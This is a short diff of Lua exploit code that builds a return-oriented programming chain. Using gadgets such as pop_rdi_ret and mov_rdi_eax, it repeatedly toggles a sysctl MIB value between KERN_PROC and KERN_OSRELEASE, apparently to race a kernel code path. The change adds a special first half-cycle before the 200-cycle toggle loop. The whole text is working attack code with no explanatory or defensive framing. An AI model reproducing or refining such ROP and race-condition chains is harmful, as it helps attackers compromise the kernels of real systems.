@@ -162,18 +162,30 @@ if m == 0xDEADBEEF then
         idx2 = idx2 + 1
     end
 
-    -- 200 toggle cycles: write 14, write 2, write 14, write 2...
-    for cycle = 1, 200 do
+    -- First half-cycle: RIP is already pop_rdi_ret, so first entry = argument
+    push2(mib + 4)             -- popped into RDI by initial pop_rdi_ret
+    push2(pop_rax_ret)
+    push2(uint64(14))          -- KERN_PROC
+    push2(mov_rdi_eax)
+
+    push2(pop_rdi_ret)
+    push2(mib + 4)
+    push2(pop_rax_ret)
+    push2(uint64(2))           -- KERN_OSRELEASE
+    push2(mov_rdi_eax)
+
+    -- Remaining 199 toggle cycles
+    for cycle = 2, 200 do
         push2(pop_rdi_ret)
         push2(mib + 4)
         push2(pop_rax_ret)
-        push2(uint64(14))      -- KERN_PROC
+        push2(uint64(14))
         push2(mov_rdi_eax)
 
         push2(pop_rdi_ret)
         push2(mib + 4)
         push2(pop_rax_ret)
-        push2(uint64(2))       -- KERN_OSRELEASE
+        push2(uint64(2))
         push2(mov_rdi_eax)
     end
 
